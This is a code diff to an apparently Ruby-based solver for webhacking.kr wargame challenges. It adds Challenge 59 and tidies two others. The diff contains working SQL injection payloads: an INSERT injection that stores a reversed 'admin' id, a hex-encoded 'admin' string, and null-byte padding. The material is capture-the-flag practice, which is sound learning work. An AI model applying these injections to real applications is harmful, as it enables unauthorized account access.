@@ -605,9 +605,7 @@ module WebhackingKR
 
     def exec
       payload = String.new
-      PAYLOAD.each_char.with_index do |char, i|
-        payload << "#{char}\x00"
-      end
+      PAYLOAD.each_char { |char| payload << "#{char}\x00" }
       query = URI.encode_www_form(PARAM_QUERY => payload)
       log('Sending payload')
       response = get("#{PATH}?#{query}")
@@ -715,13 +713,49 @@ module WebhackingKR
   end
 
   ##
+  # Challenge 59
+  class Challenge59 < ChallengeBase
+    CHALLENGE = 59
+
+    PATH = '/challenge/web-36/'
+    PARAM_ID = 'id'
+    PARAM_PHONE = 'phone'
+    PARAM_LID = 'lid'
+    PARAM_LPHONE = 'lphone'
+    ID = 'nimda'
+    PHONE = 1
+    PAYLOAD = "#{PHONE},REVERSE(`id`))-- "
+
+    def exec
+      log('Registering the ID')
+      response = post(
+        PATH,
+        {
+          PARAM_ID => ID,
+          PARAM_PHONE => PAYLOAD
+        }
+      )
+
+      log('Logging in')
+      response = post(
+        PATH,
+        {
+          PARAM_LID => ID,
+          PARAM_LPHONE => PHONE
+        }
+      )
+      check(response.body)
+    end
+  end
+
+  ##
   # Challenge 61
   class Challenge61 < ChallengeBase
     CHALLENGE = 61
 
     PATH = '/challenge/web-38/'
     PARAM_ID = 'id'
-    PAYLOAD = "0x61646d696e id"
+    PAYLOAD = '0x61646d696e id'
 
     def exec
       query = URI.encode_www_form(PARAM_ID => PAYLOAD)
